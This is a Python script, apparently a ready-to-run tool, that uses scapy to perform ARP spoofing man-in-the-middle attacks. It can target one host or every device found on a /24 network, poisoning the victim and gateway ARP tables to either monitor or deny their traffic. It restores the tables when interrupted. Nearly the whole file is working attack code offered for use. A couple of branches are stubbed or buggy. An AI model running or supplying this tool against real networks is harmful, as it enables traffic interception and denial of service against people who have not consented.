import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import time
import scapy.all as scapy
import argparse
import sys
import multiprocessing as mp

# import pyfiglet
# ascii_banner = pyfiglet.figlet_format("Network Hacker",font="banner3-D")
# print(ascii_banner)

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP")
    parser.add_argument('-l', "--ips", dest="list_ip", nargs='+', type=str,
                        help='List of IP addresses separated by comma')
    parser.add_argument("-a", "--all", dest="all", help="Spoof all devices in the network", action="store_true")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP", required=True)
    parser.add_argument("-m", "--mode", dest="mode", choices=['d', 'm'], required=True,
                        help="To Deny(d) or Monitor(m) the traffic")
    parser.add_argument("-i", "--iface", dest="iface", help="Network Interface to Use", required=False)
    parser.add_argument("--timeout", dest="timeout", type=int, help="Timeout for broadcasting ARP request",
                        required=False)

    options = parser.parse_args()
    # Check if at least one argument was provided
    if not any([options.list_ip, options.target_ip, options.all]):
        parser.error("At least one argument is required from -t, -l, -a")
    elif not options.gateway_ip:
        parser.error("[-] Please specify a gateway IP, use --help for more info.")
    return options

option = get_arguments()
processes = []

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print("[-] Could not get MAC address for " + ip + ". Exiting.")
        sys.exit(1)


def spoof_arp_table(victim_ip, victim_mac, false_requester_ip):
    try:
        target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                                      psrc=false_requester_ip)  # OP = 2 ARP response, 1 = ARP request,
        scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
    except:
        print("[-] Could not send ARP packet to " + victim_ip + ". Exiting.")
        sys.exit(1)


def restore_arp_table(victim_ip, victim_mac, false_requester_ip, false_requester_mac):
    try:
        target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                                      psrc=false_requester_ip, hwsrc=false_requester_mac)
        scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
    except:
        print("[-] Could not send ARP packet to " + victim_ip + ". Exiting.")
        sys.exit(1)


def scan_network(ip, timeout=1):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_req
    answered = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
    return answered


def start_attack(target_ip, gateway_ip):
    if target_ip == gateway_ip:
        print("[-] Skipping Gateway IP.")
        return
    print("[+] Attacking " + target_ip)
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    count = 0
    try:
        while True:
            print("\n[+] Spoofing ARP table of " + target_ip + " to " + gateway_ip)
            spoof_arp_table(target_ip, target_mac, gateway_ip)
            spoof_arp_table(gateway_ip, gateway_mac, target_ip)
            count += 1
            if option.all:
                print("\r[+] All Devices in "+ gateway_ip+ "/24 Network are being " + (" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
            elif option.list_ip:
                print("\r[+] All Devices in "+ option.list_ip+ " are being " + (" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
            else:
                print("\r[+]" + " Traffic of "+ target_ip + " has been "+(" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
        if len(processes) > 0:
            for index, thread in enumerate(processes):
                logging.info("Main    : before joining thread %d.", index)
                thread.join()
                logging.info("Main    : thread %d done", index)
        restore_arp_table(target_ip, target_mac, gateway_ip, gateway_mac)
        restore_arp_table(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[+] ARP Tables Reset Successfully")


print("\n[+][+]\t\tWelcome to Network Controller\t\t[+][+]\n")
if option.mode == 'd':
    print("[+] Starting ARP Spoofing Attack in Deny Mode")
else:
    print("[+] Starting ARP Spoofing Attack in Monitor Mode")

if option.all:
    print("[+] Spoofing all devices in the network")
    print("[+] Scanning network for devices")
    res = scan_network(option.gateway_ip + "/24", option.timeout)
    print("[+] Found " + str(len(res)) + " devices")
    for i in res:
        x = mp.Process(target=start_attack, args=(i[1].psrc, option.gateway_ip))
        x.start()
        processes.append(x)

elif option.list_ip:
    print("[+] Spoofing devices " + str(option.list_ip))
    for i in option.list_ip:
        pass
        # start_attack(i, option.gateway_ip)

else:
    pass
    start_attack(option.target_ip, option.gateway_ip)
